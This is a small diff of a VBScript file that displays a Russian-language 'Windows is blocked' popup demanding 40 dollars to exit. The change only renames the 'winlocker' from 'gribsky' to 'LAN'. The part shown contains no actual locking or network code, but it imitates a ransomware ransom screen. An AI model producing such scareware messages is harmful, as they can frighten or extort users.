@@ -2,7 +2,7 @@ Set objWshShell = CreateObject("WScript.Shell")
 Set objDialog = CreateObject("WScript.Shell")
 
 
-strMessage = "Здраствуйте, вы попали в gribsky винлокер, оплатите 40 долларов чтоб выйти." & vbCrLf & vbCrLf & "Закрыть окно?"
+strMessage = "Здраствуйте, вы попали в LAN винлокер, оплатите 40 долларов чтоб выйти." & vbCrLf & vbCrLf & "Закрыть окно?"
 
 
 objDialog.Popup strMessage, 0, "Виндовс заблокирован", 64
